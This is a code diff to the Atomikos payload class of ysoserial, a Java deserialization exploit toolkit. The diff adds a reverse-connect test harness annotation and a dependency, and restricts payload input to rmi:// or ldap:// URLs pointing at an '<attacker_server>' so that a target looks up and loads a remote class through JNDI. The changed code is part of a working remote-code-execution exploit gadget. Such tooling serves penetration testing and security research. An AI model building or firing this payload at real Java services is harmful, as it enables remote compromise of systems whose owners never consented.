@@ -6,6 +6,7 @@ import com.atomikos.icatch.jta.RemoteClientUserTransaction;
 
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
@@ -26,7 +27,8 @@ import ysoserial.payloads.util.Reflections;
 * @author sciccone
 *
 */
-@Dependencies( { "com.atomikos:transactions-osgi:4.0.6" } )
+@PayloadTest(harness="ysoserial.test.payloads.JRMPReverseConnectTest")
+@Dependencies( { "com.atomikos:transactions-osgi:4.0.6", "javax.transaction:jta:1.1" } )
 @Authors({ Authors.SCICCONE })
 public class Atomikos implements ObjectPayload<Object> {
 
@@ -35,8 +37,8 @@ public class Atomikos implements ObjectPayload<Object> {
 		
 		// validate command
         int sep = command.lastIndexOf('/');
-        if ( sep < 0 ) 
-			throw new IllegalArgumentException("Command format is: "
+        if ( sep < 0 || (!command.startsWith("ldap") && !command.startsWith("rmi"))) 
+			throw new IllegalArgumentException("Command format is: " + command 
 					+ "(rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>");
 
         String url = command.substring(0, sep);
@@ -46,11 +48,8 @@ public class Atomikos implements ObjectPayload<Object> {
 		String initialContextFactory;
 		if (url.startsWith("ldap"))
 			initialContextFactory = "com.sun.jndi.ldap.LdapCtxFactory";
-		else if (url.startsWith("rmi"))
-			initialContextFactory = "com.sun.jndi.rmi.registry.RegistryContextFactory";
 		else 
-			throw new IllegalArgumentException("Command format is: "
-					+ "(rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>");
+			initialContextFactory = "com.sun.jndi.rmi.registry.RegistryContextFactory";
 		
 		// create object
 		RemoteClientUserTransaction rcut = new RemoteClientUserTransaction();
